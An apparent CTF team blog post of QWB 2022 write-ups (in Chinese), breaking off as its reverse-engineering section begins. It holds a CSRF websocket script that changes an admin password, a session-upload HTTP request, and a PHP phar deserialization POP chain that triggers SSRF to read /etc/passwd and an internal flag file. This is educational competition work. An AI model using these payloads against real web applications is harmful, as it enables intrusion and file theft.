<!DOCTYPE html>
<html lang="en-us">
    <head><meta charset='utf-8'>
<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content='强网杯好难呜呜呜~'><title>qwb2022 Writeup by or4nge</title>

<link rel='canonical' href='https://or4ngesec.github.io/post/qwb2022-writeup-by-or4nge/'>

<link rel="stylesheet" href="/scss/style.min.css"><meta property='og:title' content='qwb2022 Writeup by or4nge'>
<meta property='og:description' content='强网杯好难呜呜呜~'>
<meta property='og:url' content='https://or4ngesec.github.io/post/qwb2022-writeup-by-or4nge/'>
<meta property='og:site_name' content='or4nge'>
<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:tag' content='Writeup' /><meta property='article:tag' content='qwb' /><meta property='article:published_time' content='2022-08-02T19:00:00&#43;08:00'/><meta property='article:modified_time' content='2022-08-02T19:00:00&#43;08:00'/>
<meta name="twitter:title" content="qwb2022 Writeup by or4nge">
<meta name="twitter:description" content="强网杯好难呜呜呜~">
    </head>
    <body class="
    article-page has-toc
">
    <script>
        (function() {
            const colorSchemeKey = 'StackColorScheme';
            if(!localStorage.getItem(colorSchemeKey)){
                localStorage.setItem(colorSchemeKey, "auto");
            }
        })();
    </script><script>
    (function() {
        const colorSchemeKey = 'StackColorScheme';
        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;

        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
            

            document.documentElement.dataset.scheme = 'dark';
        } else {
            document.documentElement.dataset.scheme = 'light';
        }
    })();
</script>
<div class="container main-container flex 
    
        extended
    
">
    
        <div id="article-toolbar">
            <a href="/" class="back-home">
                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-chevron-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <polyline points="15 6 9 12 15 18" />
</svg>



                <span>Back</span>
            </a>
        </div>
    
<main class="main full-width">
    <article class="main-article">
    <header class="article-header">

    <div class="article-details">
    
    <header class="article-category">
        
            <a href="/categories/writeup/" >
                Writeup
            </a>
        
    </header>
    

    <h2 class="article-title">
        <a href="/post/qwb2022-writeup-by-or4nge/">qwb2022 Writeup by or4nge</a>
    </h2>

    
    <h3 class="article-subtitle">
        强网杯好难呜呜呜~
    </h3>
    

    
    <footer class="article-time">
        
            <div>
                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <path d="M11.795 21h-6.795a2 2 0 0 1 -2 -2v-12a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v4" />
  <circle cx="18" cy="18" r="4" />
  <path d="M15 3v4" />
  <path d="M7 3v4" />
  <path d="M3 11h16" />
  <path d="M18 16.496v1.504l1 1" />
</svg>
                <time class="article-time--published">Aug 02, 2022</time>
            </div>
        

        
            <div>
                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <circle cx="12" cy="12" r="9" />
  <polyline points="12 7 12 12 15 15" />
</svg>



                <time class="article-time--reading">
                    27 minute read
                </time>
            </div>
        
    </footer>
    
</div>
</header>

    <section class="article-content">
    <h2 id="web">Web</h2>
<h3 id="babyweb">babyweb</h3>
<p>任意注册，main 路由下 websocket 可以让管理员访问任意 <code>ip:port</code>，修改密码，在自己 vps 上构造 script 来 csrf：</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#f92672">&lt;</span><span style="color:#a6e22e">script</span><span style="color:#f92672">&gt;</span> 
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">ws</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">null</span>; 
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">url</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;ws://&#34;</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;127.0.01:port&#34;</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;/bot&#34;</span>; 
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">ws</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">WebSocket</span>(<span style="color:#a6e22e">url</span>); 
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">ws</span>.<span style="color:#a6e22e">onopen</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">function</span> (<span style="color:#a6e22e">event</span>) { 
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">msg</span> <span style="color:#f92672">=</span> document.<span style="color:#a6e22e">getElementById</span>(<span style="color:#e6db74">&#34;sendbox&#34;</span>).<span style="color:#a6e22e">value</span>; 
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">ws</span>.<span style="color:#a6e22e">send</span>(<span style="color:#e6db74">&#34;changepwd 123456&#34;</span>); 
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;</span><span style="color:#960050;background-color:#1e0010">/script&gt;</span>
</span></span></code></pre></div><p>修改密码后拿到 hint，后台是个 go，利用 python 和 go 对 json 字段理解不同双鞋相同字段前后绕过，设置购买数量为负数后购买flag即可。</p>
<h3 id="easyweb">easyweb</h3>
<p><code>http://47.104.95.124:8080/showfile.php?f=./demo/../class.php</code> 任意文件读，审计发现触发 adminShow 的 show 可以 ssrf。
注意到 session 没开启，用 PHP_SESSION_UPLOAD_PROGRESS 强制开启 <code>session_start()</code> 来上传文件：</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-http" data-lang="http"><span style="display:flex;"><span><span style="color:#a6e22e">POST</span> /index.php <span style="color:#66d9ef">HTTP</span><span style="color:#f92672">/</span><span style="color:#ae81ff">1.1</span>
</span></span><span style="display:flex;"><span>Host<span style="color:#f92672">:</span> <span style="color:#ae81ff">47.104.95.124:8080</span>
</span></span><span style="display:flex;"><span>Content-Length<span style="color:#f92672">:</span> <span style="color:#ae81ff">400</span>
</span></span><span style="display:flex;"><span>Cache-Control<span style="color:#f92672">:</span> <span style="color:#ae81ff">max-age=0</span>
</span></span><span style="display:flex;"><span>Upgrade-Insecure-Requests<span style="color:#f92672">:</span> <span style="color:#ae81ff">1</span>
</span></span><span style="display:flex;"><span>Origin<span style="color:#f92672">:</span> <span style="color:#ae81ff">http://47.104.95.124:8080</span>
</span></span><span style="display:flex;"><span>Content-Type<span style="color:#f92672">:</span> <span style="color:#ae81ff">multipart/form-data; boundary=----WebKitFormBoundaryvR1Uq45sbhgKPcuw</span>
</span></span><span style="display:flex;"><span>User-Agent<span style="color:#f92672">:</span> <span style="color:#ae81ff">Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.134 Safari/537.36 Edg/103.0.1264.77</span>
</span></span><span style="display:flex;"><span>Accept<span style="color:#f92672">:</span> <span style="color:#ae81ff">text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span>
</span></span><span style="display:flex;"><span>Referer<span style="color:#f92672">:</span> <span style="color:#ae81ff">http://47.104.95.124:8080/index.php</span>
</span></span><span style="display:flex;"><span>Accept-Encoding<span style="color:#f92672">:</span> <span style="color:#ae81ff">gzip, deflate</span>
</span></span><span style="display:flex;"><span>Accept-Language<span style="color:#f92672">:</span> <span style="color:#ae81ff">zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6</span>
</span></span><span style="display:flex;"><span>Cookie<span style="color:#f92672">:</span> <span style="color:#ae81ff">PHPSESSID=eyJ1c2VyIjoiYWRtaW4ifQ</span>
</span></span><span style="display:flex;"><span>Connection<span style="color:#f92672">:</span> <span style="color:#ae81ff">close</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>------WebKitFormBoundaryvR1Uq45sbhgKPcuw
</span></span><span style="display:flex;"><span>Content-Disposition: form-data; name=&#34;PHP_SESSION_UPLOAD_PROGRESS&#34;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>123
</span></span><span style="display:flex;"><span>------WebKitFormBoundaryvR1Uq45sbhgKPcuw
</span></span></code></pre></div><p>通过 phar 反序列化触发 ssrf，构造 pop 链：通过先 wakeup，然后在 destruct 后重新赋值的方式来构造 url 进行触发。</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">use</span> <span style="color:#a6e22e">AdminShow</span> <span style="color:#66d9ef">as</span> <span style="color:#a6e22e">GlobalAdminShow</span>;
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">use</span> <span style="color:#a6e22e">GuestShow</span> <span style="color:#66d9ef">as</span> <span style="color:#a6e22e">GlobalGuestShow</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">Upload</span> {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> $file;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> $filesize;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> $date;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> $tmp;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> __construct(){
</span></span><span style="display:flex;"><span>        $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">file</span> <span style="color:#f92672">=</span> $_FILES[<span style="color:#e6db74">&#34;file&#34;</span>];
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">do_upload</span>() {
</span></span><span style="display:flex;"><span>        $filename <span style="color:#f92672">=</span> <span style="color:#a6e22e">session_id</span>()<span style="color:#f92672">.</span><span style="color:#a6e22e">explode</span>(<span style="color:#e6db74">&#34;.&#34;</span>,$this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">file</span>[<span style="color:#e6db74">&#34;name&#34;</span>])[<span style="color:#ae81ff">0</span>]<span style="color:#f92672">.</span><span style="color:#e6db74">&#34;.jpg&#34;</span>;
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">file_exists</span>($filename)) {
</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">unlink</span>($filename);
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">move_uploaded_file</span>($this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">file</span>[<span style="color:#e6db74">&#34;tmp_name&#34;</span>],$filename);
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#39;upload&#39;</span><span style="color:#f92672">.</span>$this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">e</span>($filename)<span style="color:#f92672">.</span><span style="color:#e6db74">&#39; success!&#39;</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">e</span>($str){
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">htmlspecialchars</span>($str);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">upload</span>() {
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span>($this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">check</span>()) {
</span></span><span style="display:flex;"><span>            $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">do_upload</span>();
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> __toString(){
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">file</span>[<span style="color:#e6db74">&#34;name&#34;</span>];
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> __get($value){
</span></span><span style="display:flex;"><span>        $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">filesize</span><span style="color:#f92672">-&gt;</span>$value <span style="color:#f92672">=</span> $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">date</span>;
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">echo</span> $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">tmp</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">check</span>() {
</span></span><span style="display:flex;"><span>        $allowed_types <span style="color:#f92672">=</span> <span style="color:#66d9ef">array</span>(<span style="color:#e6db74">&#34;jpg&#34;</span>,<span style="color:#e6db74">&#34;png&#34;</span>,<span style="color:#e6db74">&#34;jpeg&#34;</span>);
</span></span><span style="display:flex;"><span>        $temp <span style="color:#f92672">=</span> <span style="color:#a6e22e">explode</span>(<span style="color:#e6db74">&#34;.&#34;</span>,$this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">file</span>[<span style="color:#e6db74">&#34;name&#34;</span>]);
</span></span><span style="display:flex;"><span>        $extension <span style="color:#f92672">=</span> <span style="color:#a6e22e">end</span>($temp);
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">in_array</span>($extension,$allowed_types)) {
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">true</span>;
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#39;Invalid file!&#39;</span>;
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">false</span>;
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">GuestShow</span>{
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> $file;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> $contents;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> $name;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> __construct($file)
</span></span><span style="display:flex;"><span>    {
</span></span><span style="display:flex;"><span>        $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">file</span><span style="color:#f92672">=</span>$file;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> __toString(){
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#34;guest tostring&#34;</span>;
</span></span><span style="display:flex;"><span>        $str <span style="color:#f92672">=</span> $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">file</span><span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">name</span>;
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#34;&#34;</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> __get($value){
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> $this<span style="color:#f92672">-&gt;</span>$value;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">show</span>()
</span></span><span style="display:flex;"><span>    {
</span></span><span style="display:flex;"><span>        $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">contents</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">file_get_contents</span>($this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">file</span>);
</span></span><span style="display:flex;"><span>        $src <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;data:jpg;base64,&#34;</span><span style="color:#f92672">.</span><span style="color:#a6e22e">base64_encode</span>($this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">contents</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#34;&lt;img src=</span><span style="color:#e6db74">{</span>$src<span style="color:#e6db74">}</span><span style="color:#e6db74"> /&gt;&#34;</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> __destruct(){
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">echo</span> $this;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">AdminShow</span>{
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> $source;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> $str;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> $filter;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> __construct($file)
</span></span><span style="display:flex;"><span>    {
</span></span><span style="display:flex;"><span>        $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">source</span> <span style="color:#f92672">=</span> $file;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> __toString()
</span></span><span style="display:flex;"><span>    {
</span></span><span style="display:flex;"><span>        $content <span style="color:#f92672">=</span> $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">str</span>[<span style="color:#ae81ff">0</span>]<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">source</span>;
</span></span><span style="display:flex;"><span>        $content <span style="color:#f92672">=</span> $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">str</span>[<span style="color:#ae81ff">1</span>]<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">schema</span>;
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#34;1&#34;</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> __get($value){
</span></span><span style="display:flex;"><span>        $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">show</span>();
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> $this<span style="color:#f92672">-&gt;</span>$value;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> __set($key,$value){
</span></span><span style="display:flex;"><span>        $this<span style="color:#f92672">-&gt;</span>$key <span style="color:#f92672">=</span> $value;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">show</span>(){
</span></span><span style="display:flex;"><span>        $url <span style="color:#f92672">=</span> $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">schema</span> <span style="color:#f92672">.</span> $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">source</span>;
</span></span><span style="display:flex;"><span>        $curl <span style="color:#f92672">=</span> <span style="color:#a6e22e">curl_init</span>();
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">curl_setopt</span>($curl, <span style="color:#a6e22e">CURLOPT_URL</span>, $url);
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">curl_setopt</span>($curl, <span style="color:#a6e22e">CURLOPT_RETURNTRANSFER</span>, <span style="color:#ae81ff">1</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">curl_setopt</span>($curl, <span style="color:#a6e22e">CURLOPT_HEADER</span>, <span style="color:#ae81ff">1</span>);
</span></span><span style="display:flex;"><span>        $response <span style="color:#f92672">=</span> <span style="color:#a6e22e">curl_exec</span>($curl);
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">curl_close</span>($curl);
</span></span><span style="display:flex;"><span>        $src <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;data:jpg;base64,&#34;</span><span style="color:#f92672">.</span><span style="color:#a6e22e">base64_encode</span>($response);
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#34;&lt;img src=</span><span style="color:#e6db74">{</span>$src<span style="color:#e6db74">}</span><span style="color:#e6db74"> /&gt;&#34;</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> __wakeup()
</span></span><span style="display:flex;"><span>    {
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#34;wakeup&#34;</span>;
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> ($this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">schema</span> <span style="color:#f92672">!==</span> <span style="color:#e6db74">&#39;file:///var/www/html/&#39;</span>) {
</span></span><span style="display:flex;"><span>            $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">schema</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;file:///var/www/html/&#39;</span>;
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> ($this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">source</span> <span style="color:#f92672">!==</span> <span style="color:#e6db74">&#39;admin.png&#39;</span>) {
</span></span><span style="display:flex;"><span>            $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">source</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;admin.png&#39;</span>;
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">isset</span>($_GET[<span style="color:#ae81ff">1</span>])){
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">unserialize</span>($_GET[<span style="color:#ae81ff">1</span>]);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">die</span>();
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>$filename <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;testmysql.php&#34;</span>;
</span></span><span style="display:flex;"><span>$g0 <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">GuestShow</span>($filename);
</span></span><span style="display:flex;"><span>$g1 <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">GuestShow</span>($filename);
</span></span><span style="display:flex;"><span>$a0 <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">AdminShow</span>($filename);
</span></span><span style="display:flex;"><span>$a1 <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">AdminShow</span>($filename);
</span></span><span style="display:flex;"><span>$u0 <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">Upload</span>();
</span></span><span style="display:flex;"><span>$u1 <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">Upload</span>();
</span></span><span style="display:flex;"><span>$u2 <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">Upload</span>();
</span></span><span style="display:flex;"><span>$u1<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">filesize</span> <span style="color:#f92672">=</span> $a0;
</span></span><span style="display:flex;"><span>$u1<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">date</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;/etc/passwd&#34;</span>;
</span></span><span style="display:flex;"><span>$u2<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">filesize</span> <span style="color:#f92672">=</span> $a0;
</span></span><span style="display:flex;"><span>$u2<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">date</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;file://&#34;</span>;
</span></span><span style="display:flex;"><span>$g1<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">file</span> <span style="color:#f92672">=</span> $a0;
</span></span><span style="display:flex;"><span>$u2<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">tmp</span> <span style="color:#f92672">=</span> $g1;
</span></span><span style="display:flex;"><span>$a0<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">str</span>[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">=</span> $u1;
</span></span><span style="display:flex;"><span>$a0<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">str</span>[<span style="color:#ae81ff">1</span>] <span style="color:#f92672">=</span> $u2;
</span></span><span style="display:flex;"><span>$u0<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">tmp</span> <span style="color:#f92672">=</span> $a0;
</span></span><span style="display:flex;"><span>$g0<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">file</span> <span style="color:#f92672">=</span> $u0;
</span></span><span style="display:flex;"><span>$phar <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">Phar</span>(<span style="color:#e6db74">&#34;aa.phar&#34;</span>);
</span></span><span style="display:flex;"><span>$phar<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">startBuffering</span>();
</span></span><span style="display:flex;"><span>$phar<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">addFromString</span>(<span style="color:#e6db74">&#34;test.txt&#34;</span>, <span style="color:#e6db74">&#34;test&#34;</span>);
</span></span><span style="display:flex;"><span>$phar<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">setStub</span>(<span style="color:#e6db74">&#34;&lt;?php__HALT_COMPILER(); ?&gt;&#34;</span>);
</span></span><span style="display:flex;"><span>$phar<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">setMetadata</span>($g0);
</span></span><span style="display:flex;"><span>$phar<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">stopBuffering</span>();
</span></span></code></pre></div><p>任意文件读 <code>/proc/1/net/arp</code>，截取部分发现内网存在 <code>10.10.10.10</code> 这个服务</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-plaintext" data-lang="plaintext"><span style="display:flex;"><span>IP address       HW type     Flags       HW address            Mask     Device
</span></span><span style="display:flex;"><span>10.10.10.2       0x1         0x0         00:00:00:00:00:00     *        eth1
</span></span><span style="display:flex;"><span>10.10.10.14      0x1         0x0         00:00:00:00:00:00     *        eth1
</span></span><span style="display:flex;"><span>10.10.10.12      0x1         0x0         00:00:00:00:00:00     *        eth1
</span></span><span style="display:flex;"><span>10.10.10.10      0x1         0x2         02:42:0a:0a:0a:0a     *        eth1
</span></span><span style="display:flex;"><span>10.10.10.8       0x1         0x0         00:00:00:00:00:00     *        eth1
</span></span><span style="display:flex;"><span>172.18.0.1       0x1         0x2         02:42:e8:30:05:41     *        eth0
</span></span><span style="display:flex;"><span>172.18.0.178     0x1         0x0         00:00:00:00:00:00     *        eth0
</span></span><span style="display:flex;"><span>172.18.0.176     0x1         0x0         00:00:00:00:00:00     *        eth0
</span></span></code></pre></div><p>用 http 协议 ssrf 过去发现是个 nginx 的 php，有一处 ssrf，直接请求 <code>http://10.10.10.10/index.php?url=file:///flag</code> 即可。</p>
<h2 id="reverse">Reverse</h2>
<h3 id="find_basic">find_basic</h3>
<p>动调发现有多个函数都有虚拟机结构，输入部分在 0x4942 处，继续调试进入加密部分 0x750A9，它由几百个类似的代码块构成，每个代码块调用的函数都有数个操作码，难以普通地归类，故使用 idapython 动调脚本提取代码</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> binascii <span style="color:#f92672">import</span> hexlify
</span></span><span style="display:flex;"><span>
